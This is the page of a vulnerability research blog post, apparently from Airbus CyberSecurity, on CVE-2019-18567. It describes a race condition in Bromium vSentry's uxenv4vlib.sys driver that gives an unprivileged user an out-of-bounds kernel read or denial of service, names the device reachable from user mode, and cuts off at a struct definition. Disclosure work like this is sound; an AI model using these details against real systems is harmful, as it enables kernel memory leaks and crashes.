

<!doctype html>
<html lang="en-US">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#00205b">
  <link rel="icon" type="image/x-icon" href="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/favicon.ico">
  <meta name="google-site-verification" content="6M82rbbHbywBWJVHqgvO876R2q328Cy5_-ITC4OKCYA" />
  <meta name="msvalidate.01" content="F771E04128B3B728FD06490CB8D3A109" />
      <link rel="alternate" href="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" hreflang="x-default" />
  <link rel="alternate" hreflang="en" href="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" />
  <link rel="alternate" hreflang="fr" href="https://airbus-cyber-security.com/fr/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" />
  <link rel="alternate" hreflang="de" href="https://airbus-cyber-security.com/de/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" />
    
	<!-- This site is optimized with the Yoast SEO plugin v15.0 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Dive into a kernel Bromium race condition (CVE-2019-18567) - Airbus CyberSecurity</title>
	<meta name="description" content="Dive into a Windows kernel race condition leading to an OoB read or a DoS with the newest blog post by Nicolas Delhaye, Vulnerability Researcher." />
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Dive into a kernel Bromium race condition (CVE-2019-18567) - Airbus CyberSecurity" />
	<meta property="og:description" content="Dive into a Windows kernel race condition leading to an OoB read or a DoS with the newest blog post by Nicolas Delhaye, Vulnerability Researcher." />
	<meta property="og:url" content="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/" />
	<meta property="og:site_name" content="Airbus CyberSecurity" />
	<meta property="article:published_time" content="2020-02-07T07:05:19+00:00" />
	<meta property="article:modified_time" content="2020-09-08T12:44:17+00:00" />
	<meta property="og:image" content="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image013.jpg" />
	<meta name="twitter:card" content="summary" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://airbus-cyber-security.com/#website","url":"https://airbus-cyber-security.com/","name":"Airbus CyberSecurity","description":"Your Security, Our Priority","potentialAction":[{"@type":"SearchAction","target":"https://airbus-cyber-security.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/#primaryimage","inLanguage":"en-US","url":"https://airbus-cyber-security.com/wp-content/uploads/2019/12/image013.jpg","width":364,"height":449},{"@type":"WebPage","@id":"https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/#webpage","url":"https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/","name":"Dive into a kernel Bromium race condition (CVE-2019-18567) - Airbus CyberSecurity","isPartOf":{"@id":"https://airbus-cyber-security.com/#website"},"primaryImageOfPage":{"@id":"https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/#primaryimage"},"datePublished":"2020-02-07T07:05:19+00:00","dateModified":"2020-09-08T12:44:17+00:00","author":{"@id":"https://airbus-cyber-security.com/#/schema/person/be14bb7e7f6f28cac4fdba05f3873264"},"description":"Dive into a Windows kernel race condition leading to an OoB read or a DoS with the newest blog post by Nicolas Delhaye, Vulnerability Researcher.","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/"]}]},{"@type":"Person","@id":"https://airbus-cyber-security.com/#/schema/person/be14bb7e7f6f28cac4fdba05f3873264","name":"Maren Steffens","image":{"@type":"ImageObject","@id":"https://airbus-cyber-security.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/8cab5d75ad4fba88e4bbef39d2825f6d?s=96&d=mm&r=g","caption":"Maren Steffens"}}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//s.w.org' />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/airbus-cyber-security.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.6"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='https://airbus-cyber-security.com/wp-includes/css/dist/block-library/style.min.css?ver=5.5.6' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//airbus-cyber-security.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='magnific-popup-css'  href='https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='sage/css-css'  href='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=1' id='recaptcha-js'></script>
<script type='text/javascript' src='https://airbus-cyber-security.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
<link rel="https://api.w.org/" href="https://airbus-cyber-security.com/wp-json/" /><link rel="alternate" type="application/json" href="https://airbus-cyber-security.com/wp-json/wp/v2/posts/5878" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://airbus-cyber-security.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://airbus-cyber-security.com/wp-includes/wlwmanifest.xml" /> 

<link rel='shortlink' href='https://airbus-cyber-security.com/?p=5878' />
<link rel="alternate" type="application/json+oembed" href="https://airbus-cyber-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fairbus-cyber-security.com%2Fdive-into-a-kernel-bromium-race-condition-cve-2019-18567%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://airbus-cyber-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fairbus-cyber-security.com%2Fdive-into-a-kernel-bromium-race-condition-cve-2019-18567%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.4.1 stt:1,4,3;" />
<link rel="alternate" type="application/rss+xml" title="Airbus CyberSecurity &raquo; Google Image Sitemap" href="https://airbus-cyber-security.com/?feed=googleimagesitemap" />
<link rel="alternate" type="application/rss+xml" title="Airbus CyberSecurity &raquo; Google Video Sitemap" href="https://airbus-cyber-security.com/?feed=googlevideossitemap" />
<style>.post-thumbnail img[src$='.svg'] { width: 100%; height: auto; }</style><script type="text/javascript">
  var ajaxurl = "https://airbus-cyber-security.com/wp-admin/admin-ajax.php";
  </script><script type="text/javascript">
  var getLangCode = "en";
  </script><link rel="amphtml" href="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/amp/">		<style type="text/css" id="wp-custom-css">
			.inner .size {
	display: none;
}

ul.inputs-list {
	list-style-type:none;
	padding-left: 0;
}

.post-copy .code-block p{
	margin-bottom: 0 !important;
}

/* blockquote {
	word-break: break-all;
} */

.single-news  blockquote {
	word-break: normal;
	padding: 5px 15px 5px 15px;
}

.wp-block-preformatted {
	white-space: pre-wrap;
}

.inv-proj-column {
  float: left;
  width: 50%;
}

.inv-proj:after {
  content: "";
  display: table;
  clear: both;
}

.inv-proj-more h6{
	color: #82AD4F
}

.whitepaper-form h3 {
	color: #00205b;
}

body.page-template-template-careers h2.sub-heading {
	margin-bottom: 1rem;
}

blockquote {
	margin-top: 1rem;
}

main.main th {
	font-weight: 300;
}

.layoutArea {
	margin-top: 1rem;
}

#careers-page h2, h3 {
	color: #00205b;
}


.testimonials figcaption h3 {
	color: #fff;
}

body.postid-12024 .landing-page-from,
body.postid-12034 .landing-page-from {
	display: none;
}

.event-buttons {
	display: flex;
	gap: 1rem;
}

.postid-12336 .post-copy em {
	display: none;
}

.cta-box {
	background: #e8edf9;
	padding: 1rem 1rem 0.3rem 1rem;
	margin-bottom: 1rem;
}

.center-table {
	display: flex;
	justify-content: center;
}

html:lang(fr-FR) #incident-report li:not(.divide) {
	display: none;
}

html:lang(fr-FR) #incident-report .flags {
	display: none;
}

html:lang(fr-FR) #incident-report .divide {
	border-right: none;
}

.emergency-buttons {
	display: flex;
}

.emergency-buttons .flags {
	display: flex;
	align-items: center;
}

.emergency-buttons .flags img {
	height: 15px;
	width: 25px;	
	object-fit: cover;
}

.emergency-buttons br {
	display: none;
}

.emergency-buttons a,
.emergency-buttons button {
	color: #00205b !important;
	padding: .5rem 1rem;
	display: flex;
	align-items: center;
	background: #a2d45e;
	cursor: pointer;
	text-align: left;
}

.emergency-buttons a {
	margin-right: 1rem;
}

.emergency-buttons a:hover {
	text-decoration: none;
}

.emergency-buttons a span.number,
.emergency-buttons button span.number {
	white-space: nowrap;
}

.emergency-buttons button { 
	border: none;	
}

.emergency-buttons a p {
	display: contents;
}

@media(max-width: 1199px) {
.emergency-buttons {
		flex-direction: column;
	}
	
	.emergency-buttons a {
	margin-right: 0;
}
	
	.emergency-buttons button {
		margin-top: 1rem;
		width: 100%;
	}
}


#incident-report .divide {
	display: none;
}

#incident-report .divide .flags .mr-3 {
	display: none;
}
		</style>
		  <!--[if lte IE 8]>
  <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
  <![endif]-->
  <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>

  <script type="text/javascript" src="https://secure.poor6pain.com/js/211131.js" ></script> 
  <noscript><img alt="" src="https://secure.poor6pain.com/211131.png" style="display:none;" /></noscript>

  <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-K9SG7PX');</script>
<!-- End Google Tag Manager -->

<!-- Twitter universal website tag code -->
<script>
!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
// Insert Twitter Pixel ID and Standard Event data below
twq('init','o6kbk');
twq('track','PageView');
</script>
<!-- End Twitter universal website tag code -->

<!-- linkedin -->
<script type="text/javascript">
_linkedin_partner_id = "3476401";
window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
window._linkedin_data_partner_ids.push(_linkedin_partner_id);
</script><script type="text/javascript">
(function(l) {
if (!l){window.lintrk = function(a,b){window.lintrk.q.push([a,b])};
window.lintrk.q=[]}
var s = document.getElementsByTagName("script")[0];
var b = document.createElement("script");
b.type = "text/javascript";b.async = true;
b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
s.parentNode.insertBefore(b, s);})(window.lintrk);
</script>
<!-- end linkedin -->

</head>
<body class="post-template-default single single-post postid-5878 single-format-standard dive-into-a-kernel-bromium-race-condition-cve-2019-18567 sidebar-primary">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K9SG7PX"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<!-- linkedin (noscript) -->
<noscript>
<img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=3476401&fmt=gif" />
</noscript>
<!-- End Linkedin (noscript) -->

    <!--[if IE]>
    <div class="alert alert-warning">
    You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.  </div>
  <![endif]-->
    
  <div class="cookies">
    <i class="fa fa-times-circle-o" aria-hidden="true"></i>
    <div class="container">
          <p>In order to give you a better service Airbus uses cookies. By continuing to browse the site you are agreeing to our use of cookies.
      <a href="https://airbus-cyber-security.com/privacy-policy">I agree</a></p>
      <p class="opt-out">To opt out of Google Analytics data collection, <a href="#">click here</a></p>
      <p class="opt-out-success">Thanks. We have set a cookie so that Google Analytics data collections will be disabled on your next visit.</p>
     
    </div>
  </div>
  <header id="incident-report" class="">
  <ul>
        <li class="divide">

            
      <a href="tel:+330972301399">
      <span class="flags">
        <img class="mr-2" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/gb.png" alt="UK Flag">
        <img class="mr-3" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/fr.png" alt="French Flag">
      </span>
        <span>
                    Emergency Incident Response: <span class="number">+33 (0) 9 72 30 13 99</span>
                  </span>
    </a>
    </li>
    <li>
      <a href="https://airbus-cyber-security.com/emergency-incident-response/">
      <span class="flags">
        <img class="mr-3" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/de.png" alt="German Flag">
      </span>
      Emergency Incident Response – Request here    </a>
    </li>
          </ul>
</header>
  
<header class="banner">
  <div class="container">
    <div class="row">
    <a class="brand" aria-label="Home" href="https://airbus-cyber-security.com/"></a>

     <button class="hamburger hamburger--squeeze menu-toggle" type="button">
        <span class="hamburger-box">
          <span class="hamburger-inner"></span>
        </span>
      </button>

      <div class="lang_selector"><a  href="https://airbus-cyber-security.com/de/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/">DE</a> | <a  class="active" href="https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/">EN</a> | <a  href="https://airbus-cyber-security.com/fr/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/">FR</a></div>
       <form role="search" method="get" class="search" action="https://airbus-cyber-security.com/">
        <input type="search" class="form-control" placeholder="search" value="" name="s" title="search" />
        <button type="submit" aria-label="Search" class="search-submit"><i class="fa fa-search" aria-hidden="true"></i></button>
      </form>


    <div class="thin-bar"></div>
    <div class="thick-bar"></div>

    <nav class="nav-primary">

      <form role="search" method="get" class="search-form" action="https://airbus-cyber-security.com/">
        <input type="search" class="search-field" placeholder="search" value="" name="s" title="search" />
        <input type="submit" class="search-submit" value="search">
      </form>

      <div class="menu-primary-navigation-container"><ul id="menu-primary-navigation" class="nav"><li id="menu-item-29" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-29"><a href="https://airbus-cyber-security.com/industries/">Industries</a>
<ul class="sub-menu">
	<li id="menu-item-175" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-175"><a href="https://airbus-cyber-security.com/industries/defence-and-governments/">Defence &#038; Governments</a></li>
	<li id="menu-item-174" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-174"><a href="https://airbus-cyber-security.com/industries/aeronautics-and-space/">Aeronautics and Space</a></li>
	<li id="menu-item-173" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-173"><a href="https://airbus-cyber-security.com/industries/transportation/">Transportation</a></li>
	<li id="menu-item-172" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-172"><a href="https://airbus-cyber-security.com/industries/industry/">Industry</a></li>
	<li id="menu-item-171" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-171"><a href="https://airbus-cyber-security.com/industries/energy-and-utilities/">Energy and Utilities</a></li>
</ul>
</li>
<li id="menu-item-31" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31"><a href="https://airbus-cyber-security.com/products-and-services/">Products &#038; Services</a>
<ul class="sub-menu">
	<li id="menu-item-1711" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-1711"><a href="https://airbus-cyber-security.com/products-and-services/prevent/">Prevent</a>
	<ul class="sub-menu">
		<li id="menu-item-5084" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-5084"><a href="https://airbus-cyber-security.com/products-and-services/prevent/cyberrange/">CyberRange</a></li>
		<li id="menu-item-1713" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1713"><a href="https://airbus-cyber-security.com/products-and-services/prevent/">Cyber Threat Intelligence</a></li>
		<li id="menu-item-7304" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7304"><a href="https://airbus-cyber-security.com/products-and-services/prevent/vulnerability-research/">Vulnerability Research</a></li>
	</ul>
</li>
	<li id="menu-item-196" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-196"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Protect</a>
	<ul class="sub-menu">
		<li id="menu-item-330" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-330"><a href="https://airbus-cyber-security.com/products-and-services/protect/">High Grade Encryption</a></li>
		<li id="menu-item-328" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-328"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Key Management</a></li>
		<li id="menu-item-329" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-329"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Secure Exchange Gateway</a></li>
		<li id="menu-item-2030" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-2030"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Stormshield</a></li>
	</ul>
</li>
	<li id="menu-item-188" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-188"><a href="https://airbus-cyber-security.com/products-and-services/detect/">Detect</a>
	<ul class="sub-menu">
		<li id="menu-item-5153" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-5153"><a href="https://airbus-cyber-security.com/products-and-services/detect/cymerius/">Cymerius</a></li>
		<li id="menu-item-7413" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7413"><a href="https://airbus-cyber-security.com/products-and-services/detect/digital-risk-protection/">Digital Risk Protection</a></li>
		<li id="menu-item-10764" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-10764"><a href="https://airbus-cyber-security.com/products-and-services/detect/deceptive-security/">Deceptive Security</a></li>
		<li id="menu-item-3717" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3717"><a href="https://airbus-cyber-security.com/products-and-services/detect/orion-malware/">Orion Malware</a></li>
		<li id="menu-item-7000" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7000"><a href="https://airbus-cyber-security.com/products-and-services/detect/security-operations-centre-soc/">Security Operations Centre (SOC)</a></li>
	</ul>
</li>
	<li id="menu-item-189" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-189"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Respond</a>
	<ul class="sub-menu">
		<li id="menu-item-1632" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1632"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Cyber On-Demand</a></li>
		<li id="menu-item-12733" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-12733"><a href="https://airbus-cyber-security.com/products-and-services/respond/incident-response-and-forensics/">Incident Response and Forensics </a></li>
		<li id="menu-item-10440" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-10440"><a href="https://airbus-cyber-security.com/products-and-services/respond/penetration-test/">Penetration Test</a></li>
	</ul>
</li>
	<li id="menu-item-7522" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7522"><a href="https://airbus-cyber-security.com/products-and-services/ot-security/">OT Security</a></li>
	<li id="menu-item-191" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-191"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/">Consulting Services</a>
	<ul class="sub-menu">
		<li id="menu-item-3616" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3616"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/cyber-security-exercises/">Cyber Security Exercises</a></li>
		<li id="menu-item-4007" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-4007"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/cyber-incident-games/">Cyber Incident Games</a></li>
		<li id="menu-item-3684" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3684"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/it-security-awareness/">IT/OT Security Awareness Training</a></li>
		<li id="menu-item-4006" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-4006"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/social-engineering-penetration-tests/">Social Engineering Penetration Tests</a></li>
	</ul>
</li>
	<li id="menu-item-8218" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-8218"><a href="https://airbus-cyber-security.com/products-and-services/innovation/">Innovation</a></li>
</ul>
</li>
<li id="menu-item-25" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-25"><a href="https://airbus-cyber-security.com/about/">About Us</a></li>
<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-30"><a href="https://airbus-cyber-security.com/news-and-events/">News &#038; Events</a>
<ul class="sub-menu">
	<li id="menu-item-2327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2327"><a href="https://airbus-cyber-security.com/events/">Events</a></li>
</ul>
</li>
<li id="menu-item-32" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-32"><a href="https://airbus-cyber-security.com/resources/">Resources</a>
<ul class="sub-menu">
	<li id="menu-item-5612" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5612"><a href="https://airbus-cyber-security.com/resources/">Data Sheets</a></li>
	<li id="menu-item-5611" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5611"><a href="https://airbus-cyber-security.com/resources/?whitepapers">Whitepapers</a></li>
</ul>
</li>
<li id="menu-item-26" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26"><a href="https://airbus-cyber-security.com/blog/">Blog</a></li>
<li id="menu-item-3988" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3988"><a href="https://airbus-cyber-security.com/cyber-security-jobs-careers/">Jobs &#038; Careers</a></li>
<li id="menu-item-27" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-27"><a href="https://airbus-cyber-security.com/contact-us/">Contact Us</a></li>
</ul></div>    </nav>
  </div>
  </div>
</header>
  <div class="wrap" role="document">
      <div class="container">
                      <header class="page">
        <div class="row">
            <div class="col-md-12 col-lg-7 col-xl-9">
                                    <h1>Dive into a kernel Bromium race condition (CVE-2019-18567)</h1>                                                                    <span class="pub-date">
                        Published:07/02/20                    </span>
                                                              
            </div>
        
            <div class="col-md-12 col-lg-5 col-xl-3">

                  

                <div class="share">
                    <strong>Share:</strong>
                    <ul>
                        <li><a target="_blank" rel="noopner noreferrer" href="http://twitter.com/home/?status=Dive into a kernel Bromium race condition (CVE-2019-18567) - https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/"><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/twitter.svg"></a></li>
                        <li><a target="_blank" rel="noopner noreferrer" href="http://www.facebook.com/sharer.php?u=https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/&amp;t=Dive into a kernel Bromium race condition (CVE-2019-18567)"><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/facebook.svg"></a></li>
                        <li><a target="_blank" rel="noopner noreferrer" href="https://www.linkedin.com/shareArticle?mini=true&url=https://airbus-cyber-security.com/dive-into-a-kernel-bromium-race-condition-cve-2019-18567/&title=Dive into a kernel Bromium race condition (CVE-2019-18567)&summary="><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/linkedin.svg"></a></li>
                    </ul>
                </div>

            
            </div>
        </div>  
    </header>
            <div class="row">
        <main class="main">
        
<div class="container">
    <div class="row">
        <div class="col-sm-12">
                            <section class="post-copy">

                    
                    
                    <em>by Nicolas Delhaye, Vulnerability Researcher</em>

                    <div data-mh="tags">
            <ul class="tags py-3">
                            <li><a href="https://airbus-cyber-security.com/tag/cve/">CVE</a></li>
                          <li>/</li>
                                <li><a href="https://airbus-cyber-security.com/tag/deep-dive/">Deep-Dive</a></li>
                          <li>/</li>
                                <li><a href="https://airbus-cyber-security.com/tag/reverse/">Reverse</a></li>
                          <li>/</li>
                                <li><a href="https://airbus-cyber-security.com/tag/vulnerability/">Vulnerability</a></li>
                          <li>/</li>
                                <li><a href="https://airbus-cyber-security.com/tag/windows/">Windows</a></li>
                          </ul>
  </div>
                    
                    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><body><p>The Bromium vSentry solution is a product deployed on end-user workstations which takes advantage of hardware virtualisation features in order to isolate untrusted or exposed software.</p>
<p>As part of this analysis, it is possible for a non-privileged user to cause a Denial of Service (DoS) in the client side application of Bromium vSentry 4.0.3.2060. A race condition permits an Out of Bound (OoB) read, resulting in kernel memory leak or Denial of Service depending on whether a read access violation occurs.</p>
<h2>Vulnerability</h2>
<p>The vulnerability is located in <span style="color: #ff0000;">&laquo; uxenv4vlib.sys &raquo;</span> version <span style="color: #ff0000;">2017.1128.23039.33944</span>. This driver is in charge of managing the uXen V4V between the host and the guest. More detail on this will be discussed later in this article.</p>
<p><img loading="lazy" class="lazy aligncenter size-full wp-image-5879" src="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image013.jpg" alt="" width="364" height="449" srcset="https://airbus-cyber-security.com/wp-content/uploads/2019/12/image013.jpg 364w, https://airbus-cyber-security.com/wp-content/uploads/2019/12/image013-243x300.jpg 243w" sizes="(max-width: 364px) 100vw, 364px"></p>
<p class="Standard">It starts with the possibility to establish a communication channel with one of the Bromium drivers through the symbolic device name <span style="color: #ff0000;">&laquo; \\.\v4vdev &raquo;</span>&nbsp;from standard user rights. It is then possible to create specific IOCTLs related to the Bromium data ring management. Before going into more technical details, we need a little more explanation about the V4V technology.</p>
<p class="Standard"><b>Here is an extract of the v4v technology documentation</b></p>
<p class="Standard"><i>&ldquo;The V4V technology is a new approach to inter-domain communications on a Xen virtualisation platform. Most existing inter-domain communications frameworks use shared memory between domains and some form of event channel interrupt mechanism. V4V is a departure from this approach, instead relying on the hypervisor to broker all communications. Domains manage their own data rings and there is no sharing of actual memory. Domains communicate with one or more other domains (or themselves in the trivial case) using source and destination addresses and ports.</i></p>
<p class="Standard"><i>The basic construct in V4V is the v4v_ring. A domain that wants to communicate with other domains must register a v4v_ring with the V4V management code in the hypervisor.&rdquo;*&nbsp;</i></p>
<p><i>Source: <b>OpenXT github</b></i></p>
<div class="code-block" style="border: 1px; border-style: solid; border-color: #00205b; padding: 1em; margin-bottom: 1rem;">struct v4v_ring<br>
{<br>
&rlm;&rlm;&lrm;<span class="pl-5">uint64_t magic;</span><br>
&lrm;&rlm;&rlm;&lrm;&lrm;<span class="pl-5">struct v4v_ring_id id;</span><br>
